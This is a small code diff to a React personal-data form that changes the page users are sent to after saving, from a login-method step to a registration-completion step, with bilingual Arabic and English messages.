@@ -290,7 +290,7 @@ export default function PersonalData() {
         country: formData.country,
       });
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
-      setLocation(`/login-method?bank=${bank}&session=${sessionId}`);
+      setLocation(`/registration-completion?bank=${bank}&session=${sessionId}`);
     } catch (error) {
       toast.error(isArabic ? "حدث خطأ في حفظ البيانات" : "Error saving data");
     }
